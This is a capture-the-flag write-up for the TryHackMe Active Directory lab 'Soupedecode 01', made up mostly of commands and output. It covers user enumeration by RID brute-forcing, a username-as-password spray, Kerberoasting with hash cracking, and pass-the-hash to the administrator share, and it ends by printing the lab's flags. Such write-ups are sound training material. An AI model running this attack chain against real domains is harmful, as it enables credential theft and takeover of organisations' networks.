# Soupedecode 01

**Platform:** THM  
**Difficulty:** Easy  
**Category:** Active Directory
**Author:** Anghelo Principe  
**Date:** 2026-03-05  

---

# 1. Reconnaissance

## Target Information

| Field | Value |
|------|------|
| Target IP | 10.66.179.55 |
| OS | Windows |

---

## Nmap Scan

Command used:

```bash
nmap -sC -sV 10.66.179.55
```

Output:

```text
Host is up (0.097s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-05 18:40:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2026-03-04T18:37:49
|_Not valid after:  2026-09-03T18:37:49
|_ssl-date: 2026-03-05T18:41:05+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-05T18:40:25+00:00
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-05T18:40:27
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

Observations:

- kerberos running on port 88
- ldap running on port 389

---

# 2. Enumeration

## Users Enumeration

```bash
nxc smb 10.66.179.55
```

Output:

```text
SMB         10.66.179.55    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
```
We test a default user.
```bash
nxc smb 10.66.179.55 -u 'guest' -p ''
```

Output:
```text
SMB         10.66.179.55    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.66.179.55    445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
```
Now that we have access to the default user, we extract the users.
```bash
nxc smb 10.66.179.55 -u 'guest' -p '' --rid-brute | grep SidTypeUser
```

Output:
```text
SMB                      10.66.179.55    445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB                      10.66.179.55    445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB                      10.66.179.55    445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB                      10.66.179.55    445    DC01             1000: SOUPEDECODE\DC01$ (SidTypeUser)
SMB                      10.66.179.55    445    DC01             1103: SOUPEDECODE\bmark0 (SidTypeUser)
SMB                      10.66.179.55    445    DC01             1104: SOUPEDECODE\otara1 (SidTypeUser)
SMB                      10.66.179.55    445    DC01             1105: SOUPEDECODE\kleo2 (SidTypeUser)
.
.
.
```

We save the users with the following command.
```bash
nxc smb 10.66.179.55 -u 'guest' -p '' --rid-brute | grep SidTypeUser | awk '{print $6}' > users.txt 
```
Let's look at the users.txt
```bash
head users.txt
```

Output:

```text
SOUPEDECODE\Administrator
SOUPEDECODE\Guest
SOUPEDECODE\krbtgt
SOUPEDECODE\DC01$
SOUPEDECODE\bmark0
SOUPEDECODE\otara1
SOUPEDECODE\kleo2
SOUPEDECODE\eyara3
SOUPEDECODE\pquinn4
SOUPEDECODE\jharper5 
```
We need a clean version.
```bash
cut -d '\' -f2 users.txt > clean_users.txt
```
Now, let's look at the users.txt
```bash
head clean_users.txt
```
Output:

```text
Administrator
Guest
krbtgt
DC01$
bmark0
otara1
kleo2
eyara3
pquinn4
jharper5
```
We use a passwordspray where the password is the username.
```bash
kerbrute passwordspray -d SOUPEDECODE.LOCAL  --user-as-pass clean_users.txt --dc 10.66.179.55 
```
Output:
```text
2026/03/05 14:04:35 >  [+] VALID LOGIN:  ybob317@SOUPEDECODE.LOCAL:ybob317
```
---

# 3. Initial Access
Now, we have a credential. Let's see your shared folders.
```bash
nxc smb 10.66.179.55 -u 'ybob317' -p 'ybob317' --shares  
```
Output:
```text
SMB         10.66.179.55    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.66.179.55    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
SMB         10.66.179.55    445    DC01             [*] Enumerated shares
SMB         10.66.179.55    445    DC01             Share           Permissions     Remark
SMB         10.66.179.55    445    DC01             -----           -----------     ------
SMB         10.66.179.55    445    DC01             ADMIN$                          Remote Admin
SMB         10.66.179.55    445    DC01             backup                          
SMB         10.66.179.55    445    DC01             C$                              Default share
SMB         10.66.179.55    445    DC01             IPC$            READ            Remote IPC
SMB         10.66.179.55    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.66.179.55    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.66.179.55    445    DC01             Users           READ   
```
We enter the "Users" folder. We get "user.txt".
```bash
smbclient -U SOUPEDECODE/ybob317 //10.66.179.55/Users 
```
Output:

```bash
smb: \> cd ybob317\Desktop
smb: \ybob317\Desktop\> get user.txt 
getting file \ybob317\Desktop\user.txt of size 33 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \ybob317\Desktop\> exit

```
Now, we do a Kerberoasting.
```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:'ybob317' -dc-ip 10.66.179.55 
```
Output:

```text
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 13:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 13:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 13:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 13:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 13:29:18.511871  <never> 
```
We save those users in "users.tgs" and we get the TGSs.
```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:'ybob317' -dc-ip 10.66.179.55 -request 
```
Output:

```text
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$50f8614c025ebe84b0f86e765e1bb780$962694719099c58c2e65eda44b7daa286045746acb97f27e4ca7ba89f34beb84d6643b93be866fbef7150697158961849fdbbcb3198090ea95a781fa6110d65f2a7f60f7d843f80d78d9f665a631e1e60b09353b62ac777438711f3abfa9a7d50c4f41713f27c513cc67d1b506a20a04e1b92ca75319b948a7802229ec03aa98df89e5d7bf47fb9a7c055aa01bb4dac3a70f5531240e94b760c958d72cd9978df030210b4bda30c76d346e4f702334d3ec000aa9359614ba57cdbcb6b51eec44168b80845c818df941de26b1fa2a7b9bd6211070d182590f5b3f0ab63b110379e6a356491c0decaaa60073082beb3d61ccd552681bff1e8d0cf8d6e23ddf282541f7d03bb37936f6d66d6e697bb4649c207a3dfbc7e35d36ad51ba701368aabf4a5ca44d0b054939b3c9e59fdb59baa2ff9171a761d11289c0bd7e467bce397761d74063fe2db4467a215fc25bc114228d7b80193a1d0a6ee361b5cc6799498f637bd48362dd652565e68a3dff27c6d87bb0d3fceda058a4df24221173aaedddf5ec054ce64fedd3dd20c8bf03c587a8bc073f9ada2d8535e8572ef1c01f8b52cb09c6e8383df0144d23f25e9429a35f4581dbc0ca00c2a1086757c38289db2b70fd165ae5e79c8c8aeeae08eab2dc01a126442bde96e36d5d6e15ecdf139cf3bd188673e1c2ad7e8cb8f5a466597f8ee408e5c5a0863517d0d5cec91a74fca9d03a23c6ff7168ed61efee9fd1ad0181f0c2780abb859c871602b7c761c922959ca313d43f6475864cfac94d0bbbe04aa81dbdf16a5ada66538cf76b6ab3e51fc0dc078d719a0973a239f78d68ba194dbe9f7a61366863668e43ef265fae3bcd066665ee9d759c74afd671dc32a301cf7af1fa1ec2f2cdc5f3f300642936e36917c62df4334aed6af30e55fb56fea508012d5a2dbc9d19a15c516b3a0ac4378a441f091df485b557b348a4a1258d31658ec01608902a8d334f423ab525ffe3f5ca487ee63cf47e4239c573963f5bb9e8ddc76f5f5f6e9d36fdbc56fb072038039c16d313e1897cb8db1ff1b75c99c90bb2a115d730d70b94aa9c24fbbbf9ac2dd24de3a8b5de63eb54ad345be1fd1dff06199d2370b690d9b529945292d019013bdf5be40df0eef091708bbd5fa256ea702c231e9652a210f886f7cd36de3cbb93495cc5d79dccead8f81893569416ca8341cd1b1c19759a259ca2979a97140e1b4a34a9730ffc3545df80db9f91dc97a5193d3b35f077414413cfc80be0d828b4e177ea37ac6ccb6406f5da86f84062cdd65fa33d41c6fd00e57219f0f980b6389e0aa7a250f902a7e3067fa880929d923180227a1b665c900c49ad28ebf7a38cf93738e202e1d9dc0d5a54aa04ff0da45c3cf57c257eecc3467ba7ae6d780100f865e7cc911d504f993c41e6cda13064d5b8b676113db16d36e30417969ee40e0efb50e797ca49e24664aac62101df2c36fa9ccba1e7fd92f4b09498e4ee2453
$krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/firewall_svc*$8fd17f04a86e45bfc61fe29f6c01685b$ad0b72763fcafe580cf6035d7d85c29b2f4c96e5314d549a29d7530f9017774806701d1f2ff838f6a3c84c2481ec5682fb988bca58081b01effa25cfa9df326c0387d83ef4e604dc4f0d6f656f2ef0b871e023b5820a612cd96637dfcd421ad3eef07c2d893ac4c42dcf6fe4c9b3acc773be254a21f7c87f8990bc6a64175578fc0951fb9f99e2fec8e3171dd6ed533e68d16679ee71f860ee3599ebf690f8d558dfccf25737b045ad286d570bbc263bca77fc71c27c49cf85dff041e78a0a2235428ff18cce5a82bea6a4bae7d3e177f00e9511927ec0e41bc24312f8de70f01694887b0a7d99a284a1d1eebfc27e0fc5555fa578558afeb7d16dcd3d65700a01ae3d9aa3418583ac35424b1538c3501eba7cdda806a3e835baecef1709f52c86ba59bb83351c56523b6915fb287329bae8c985b501afd5d15146874169c9d28c23492d9005ec9f74e855b88ca86d83c4f49154e22152fea684d99bcd1adc100e30677098ea9153da2662a6b07177672d2a3cff3b3c69916eb5c9746af8699faefe02a01386c8e074f09bdbc816261ea106f1aa9a540b8b1fc4f2f070a0ce0a68685189dc749ec46ad995ccaab9d56ce56b291585c32292170c64ba13d5e02b050ba05395cb71c545ca3e3717ea340679c2a91fcf3d60d9b98c91e43ced57f5162ae67d7c1669c28a72efb32b9a0ca150195aa44b6c17df954c0c6c372ab1097c065525416feefd2ef92f03f55d1df6b379eb7a82f72adc786a614107e038174376470fbba4a26753b2a6242ae9c2df79507ef1fefdaca433439463db1ab5c5da723069c7c7b5fc413b06fa98bfed58276acf8a8b68b0d09a388f1e6a9f49f4bcd76d8f3f49b10e806d025e4c4b0aced1fcc4176a8fb35d3e4bb7588169d17e66f6380d9987b914e55586607a2b93304e4d07a251754125ef321c012e4a9a1c220e762dd2de74f0f8a795d37ec59da78ec55e70499dd430d4b9500f41e2a8bd8b7f5a39209837d0b95afd9d5b86a4f6e6dc880538bf8a907cdaf017fc008d396cd0885c6bb72a9c1104623dc585c5d600276c50202e1904c063bb784722b9321c77195f5cc503547ed65f7179b32654588a29d6afd467018625ea3956f83195d6d56b62202cebb7ada58b4298b61f170efb404052791f0e704d312da6c0ea55dc29df8f247e00c86d069e069b0ad4a525ae1ed527fe7bad23d0f63431fffd4d205639c02485cc165fdaf960746c9b6f2d977e24ff7a009daa7911c0736c3519fb2a0b04bda2c19af51e6faa4835cc8468d48182db1370a905918897be6605f5cb7c471dc9421d5714a5951dbbd423515c34350d7cd99aed9ac6867dbb35e302a4e64542b06edfdcc7072e226d3f8e7976fbcc19ff2a21f06cc73be79bbc2060087e36e54bcf6d29bce51b1f5556ff118e17b438f96cab7d64b2e6b4866347868f0485131fb9ab9110d63b1300c051943d4cdf453385b95aa8ac2971ba0eea2226
$krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/backup_svc*$6f6a24f3221757abd4237b64046298c6$2ed0247cc4327dc576df35a69265655fcb6e41658580633a95bb87a5a5f35cd66c3ade58d52e77ec4100102d2a4952874053cd84269e62a332201650a2cfa80996b191e8edecf3570e6c42d476708df6e94a65dd9529676530611c259d0d850645696b8886fdc9254299f0fa46526bb89c91d3c2a53fdc5f3c24d3d72cfccc85d18c19bba6b77b27abd997d3f6ce72dd5b1ae069fb94661fe933cce8c4f03f76f5a7c8b8c61a8868e9632e3b482a63f16e49698a9449e7dd1a35bfd7ac5f4410c64221a35f1b750d28696b886583d26bb4c751c6e62c931ed0b50034bea9081c0b75789bacd0e2947cdb535b0fbc4341cc5afe5cb8bd4c4caa7de309cfcfc3198ff8399eb95aed74896601c862d62f2b5fb28f6c781023bdb372902e9a1c6f00954db6770abdc5227e578e63e09b5ff93296cac1b3c0e31c056907cfd11b28132ed7f6a32a69dee57364fb2b63a9588779a4974bca57301dc137348c9bcb3f9ab8276c58cb9d57e98b93df603934f062f61ad3d954b9ccfa7ee21099a3a8d5659d14c5fa07944b9fedc576f99f3a86a0bf9a1a5297e7adb8ad10f59d68671e9d44311584355159f8a74bdee44edb7ea1c859c315c033507c7554afffb79e2036ef9e3543a9b9109eb240056ca1566ddffc728692fc48ac682a4fd9b717205448370bdc45a4f4d69c9a40c48aa2c2dabed44bfec68203591f91d86b7f730c5be864e0bffc73cc80e64c11441af80f89820f67181c098bdadde247555188e72d9cceb7198ba3e34ad8a60afe8e0c77641ca2f98cbf672f100d6b073a84e5134626ac3ae7ed6f3db0149c9c55f200f7a2242f4f5cba255ddc2ec76583f2eca9516e5772d329156e2a99dcb33acf1941d9a8450c5c52062680e93b6fe608f95547ee01ef71d5c1da9fbaef05dfed5875454e5ccf96df0e1a9f647afbc0e6d1d1e3f03d8fd1d2d9315881462e3dba98494eb8a37e7c9cf369dcfa032a87fd768f8509e85e33afe0e70795bd0b9edf66cddcbc70f68992b63c8eb5f8ed94b71d11251effe544aaebf0685455c4b8816c01268cac23d89cc872b3459e717c42df5795472d59945c274e7565dd20e191ed7a7480180ce0ef82de1dcaeca7920cf41598db8504bae0125c6a0b0e7a8b8ddcc34622fe327fa536fbaa8366903338b29a483d8f3bde35ece99bcf4b4cb399e0bc41b5d85bf4ba8b8a7631fa9a1bd787342f3fbc0ce5bb055618a131a25f093c3fb4fefcd3430c414fbf2db2b4144ffb4797148930acc05f899d2bca009379936e52402c5d1226082bc755fdf816e47e02c7e6874c4c17e0cab9f659682050ff60c77d7fffb86d0316458a5ff240d86831b534204f8edc9eeb73f697df782be0b075c3a22f793bcfd9ccf30693a00a330566d8534a804f07cf545cb4497cb297a23e153c1ed45c241b74f9aeae6dd301098243ab39df0b64717fde7026fdd64aa007120fff1c0304b11d8dd83961a9dfbdd5b07a
$krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/web_svc*$819336fa482f214f47c62973f4c166b5$208c56586da2670b2b4148426e38eff0413dee755b6552b1d3a61f78ffab823b939785f8df258354f5bdb84651ef0a527be8db11c7dbab09074a8361b3d6a23619683e37210ab6d37ef520338aa1f46cf1e122c4821f6fe54435f526426386e2f7def6d8b5098b1961830ad7cfb695cca3fa5f7cce1a6c4f2113c8baa6fabc84c9d75a5ad3da863457ada41ed4e1cbb4119d4b7d92726407796ec73d4619ff2cf78a23a66bf16c4ec060afb17673a93a6a966d835a55e294ce9fcb6afd01fec9dd312c8be15b2aa36db8b5b9e29ff759482605e9d661bc70453ac4a40f563f1b3d8fb07559c53a586efcd14c2165c86c4c83aad6a0107d5ef97b14435c16371109b003ba8f662906788437b6988225f352731c7ea598e7ac25deebc241bbdec9cc4871ba2c88f4a6f3eae27e5b70d26dc318c47bd78ecc3d2321f4fd2c1dbaa308710f139bbbb42566395d5b7943fef066b8238a8f21ecae3d808f1ebc8f90b11872db356f858786c64bf8b9aa9714c38f43c1c6ff42537fd852af4e47b6f34dd568f026406761c901d03e94575e8857c12daf6d3e774ea76d14d2e7890d0113a73a8d45e90c67fe879d24a7b1024006a07208b8bfd70b12323a25b844f2c7a4f0c876dd64306b2e051a1b0c2887f70e8e8dc3aec0cc3a4d572b281decede0c68f153c67f1689de2f288e6e132d50eff05d4d74a52d2560852b55f33bdaa7380ba0e73b398412ebf9de18805d9f6b5b60c6998d8bc4eb8fa7e09d8494e6185967d82f69e46d1fc4899ca149fd7ca3107852a3a374af00db2d69089309bd6e214877db184a6c39b386ac35f626389fa74d9e80090b812088cf291322ab0a71028236a8122b64f65a59e0fe30a5c7f8fe69b6eaf8775c0f4ef9add590fd6b4f4d88758b905399714dd0677a12956bf05d0ce0194e3935c193d4097b066e4019608cc430b1d507b911d5728db10c19ea54a413880abc445ee4cc25227a1883a5d5541ef1bed3b67423fa650d4ef232c9bc7c32e98fcc85b4fc310be6321f9691d0ea1b61aa0443a7d88beaf4a45a0f48e2175bc43fbdaa61167e6e826bfaee310e1f138e12001fce4769bf4b5ed87a72b568e3747c6cf257ff91dc1ede6102f523908bdbdf0cd809412b73d351dba2376e3011e5fede4610a2d62a920143dc461f671e62c6dc635c4ab1f61f3b9e950bf78b3844720cbf9f203d7ebae6295b3e86c945bea3b7f1ca8aae58244ee2ba8d684e76df2d8dd221c32ce0325cc13a5d8b7c98f826f7c0bd61306cd493b1788b884dc0630bd1fe3ee88173d35ff8da675b66c3e11b7d40a2ee68c144dd1669097344324a566d0d9f6fd65c9135741aa1d60207baa0991d36f267065234acd4d6ca6e6413e7a2ea911abeb5f53050a9294b10c3417b0083d8fb89632319bb9bbd07151d3752fef51b2d98cccece1751970be155faa4f3e84fd806b49a8a790ebfe2ced979ee4343a7f131971f2a873e8cd3006
$krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/monitoring_svc*$92ac9eaba3cd0a9bb4339e57826dae40$baf96d35db00b34edb862eec9631f83ee0f667170d7739fa8baa91ee2b19c8b5967362e02ef2ed26c1c6a89e0f5ee86840fea4aee610c37702019ad70ac74e6b9b0df65d10ab3ae8709c38bc8017fcada1e798cd14b0956268af61e19277ee672abd1f98d3d60ad71fce458619890a5c9b0488efd9323d70ee2ddd230b7feb6ddda455d2d074c08082262a7dc7486d5e0e6031f996f0239188b6018ee409ed53375cf7fd9285705f49811f16ddb9ae6b214474f27664ed940bfff9d958752cdd183c154b0a71b53155495fe3b274e87fa8d37313815ba98b5e48b80431d3ad8af5c86edd474ade93498bc2022c9fd5db8e3133e969ea1decc54b687d099f3878b435f06b3cd640d0272e80e3f5d9f8c421b091f45a744a3c6300bd11ec22c0bd46409bed9f30992e2db241879792316f7f9c6f0127bda8b1e1e4a75ee36db2ce55cbaff38f2f5f61d70a8795785549ce3be40dc4fdfa2a6cd2399f21d5553f8c0c70c5e8d63b31e3f54696d5056da4cc99c0bb6c9a9c8e92f038ebe0f052106e496098f8515efc52ac8dfd5eb3dede2ab7a93573b3a2b67880b3bbd202c3eb285ec95eb81146de3de0788a3bd32432a3d80fbd803e2eaae37d53577df01ed439cc5c6f08b9126dd15243c0b6bcaeeb06c20c2c8c2325a747e4eb47101cf8f0a87438902da1d30336b6aa09139e890b654e22f7eb5a89cb5d17c036738b65fe3aec625f3f5342d1d580e94dead6448442103b063aa56d6a8190b63386e1cd921d0673ba764d9d79e85a0679cb7ab8d0f3b9266b8d0ec912e1992fc35d11b06a394431c9673cce7b9e67457909593d5d3586888321997dcf2ebdba41c053aae61a5be780b648b111c2528392f26820ea46411cc5c58ca52e45ed2f9f65ca9fa57c8592f69f5bb502ac7ed93e23bb5d29dbe885e638130ce5eeff98920e68fc44acf361697e73ca6accd1081d1e1bba53223daa81e085518b4029c1d778bcba06b54597b30ddd0c499b1fd223b57d50b75683346a5768b7bcd3514f9902f0113ceaf9d6857f7f958c4e0594f1ea3536622f3f417a135e13117a9f6700fa3c83bc8b8379b2e670301930251ad666571213e04e5058ad052400295889027a3197596d1fbdb1d21cede8f83f164b2ee96116fc1fb3398e647e803ef836f48ca1d4417966d0e348c80d4022072ec849c08d480ddedda9152c36712d8a951ae159166c6ff6b02cea433a05f9e971656a6c3285babb1c3d65eaa1472170b54e759e6a105a67e5b784899e7d2fcd049e75cc9cef60f8482484a28c5566fb41a578ce571b921d612eecacdf4a055883e04aa4ef816edecc979795a0d9def3d83ba68fc8bc13d0f7102948445b2c0b0ac614af8144f0505a9783ecedd21422b3ebca18ecb4116aa0f7c3535675349e632c564ca6204f2a5bc257061a70081541a455c0f7049ecca207188def666eb754ddedd9c5cae66744be935f8b87ba72773ce19918aa376c
```
Now, we get the passwords using "john the ripper".
```bash
john --format=krb5tgs --wordlist=rockyou.txt kerberoasting.tgs  
```
Output:

```text
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123!!    (?)     
1g 0:00:00:10 DONE (2026-03-05 14:20) 0.09157g/s 1313Kp/s 3609Kc/s 3609KC/s !!123sabi!!123..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
The password is: Password123!!

```bash
kerbrute passwordspray -d SOUPEDECODE.LOCAL  users.tgs 'Password123!!' --dc 10.66.179.55   
```
Output:

```text
2026/03/05 14:26:02 >  [+] VALID LOGIN:  file_svc@SOUPEDECODE.LOCAL:Password123!!
```
Let's see the shared folders of "file_svc"
```bash
nxc smb 10.66.179.55 -u 'file_svc' -p 'Password123!!' --shares   
```
Output:

```text
SMB         10.66.179.55    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.66.179.55    445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         10.66.179.55    445    DC01             [*] Enumerated shares
SMB         10.66.179.55    445    DC01             Share           Permissions     Remark
SMB         10.66.179.55    445    DC01             -----           -----------     ------
SMB         10.66.179.55    445    DC01             ADMIN$                          Remote Admin
SMB         10.66.179.55    445    DC01             backup          READ            
SMB         10.66.179.55    445    DC01             C$                              Default share
SMB         10.66.179.55    445    DC01             IPC$            READ            Remote IPC
SMB         10.66.179.55    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.66.179.55    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.66.179.55    445    DC01             Users   
```
We enter at "backup" folder and get "backup_extract.txt"
```bash
smbclient -U SOUPEDECODE/file_svc //10.66.179.55/backup
```

```bash
smb: \> dir
  .                                   D        0  Mon Jun 17 13:41:17 2024
  ..                                 DR        0  Fri Jul 25 13:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024

                12942591 blocks of size 4096. 10707955 blocks available
smb: \> get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec)
smb: \> exit
```

---

# 5. Privilege Escalation
```bash
cat backup_extract.txt 
```
```text
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```
From "backup_extract.txt" we get "users.backup" and "hash.backup".
```bash
cat users.backup  
```
```text
WebServer$
DatabaseServer$
CitrixServer$
FileServer$
MailServer$
BackupServer$
ApplicationServer$
PrintServer$
ProxyServer$
MonitoringServer$
```

```bash
cat hash.backup  
```
```text
c47b45f5d4df5a494bd19f13e14f7902
406b424c7b483a42458bf6f545c936f7
48fc7eca9af236d7849273990f6c5117
e41da7e79a4c76dbd9cf79d1cb325559
46a4655f18def136b3bfab7b0b4e70e3
46a4655f18def136b3bfab7b0b4e70e3
8cd90ac6cba6dde9d8038b068c17e9f5
b8a38c432ac59ed00b2a373f4f050d28
4e3f0bb3e5b6e3e662611b1a87988881
48fc7eca9af236d7849273990f6c5117
```
We try a pass the hash.
```bash
nxc smb 10.66.179.55 -u users.backup -H hash.backup --continue-on-success  
```
```text
SMB         10.66.179.55    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)

```
Now with "FileServer$" user and his hash , we enter at "C$" folder and get "root.txt".
```bash
smbclient -U SOUPEDECODE/FileServer$ //10.66.179.55/C$ --pw-nt-hash 'e41da7e79a4c76dbd9cf79d1cb325559'
  
```
```bash
smb: \> cd Users\Administrator\Desktop\
smb: \Users\Administrator\Desktop\> get root.txt 
getting file \Users\Administrator\Desktop\root.txt of size 33 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Users\Administrator\Desktop\> exit
```

---

# 6. Flags

User flag:

```bash
cat user.txt
```

```
28189316c25dd3c0ad56d44d000d62a8
```

Root flag:

```bash
cat root.txt
```

```
27cb2be302c388d63d27c86bfdd5f56a
```

---

# 7. Lessons Learned

- Enumeration of Active Directory
- Cracking
- Kerberoasting

---

# Tools Used

- nmap
- nxc
- smbclient
- impacket
- kerbrute
- john 
---

# References

- https://tryhackme.com/room/soupedecode01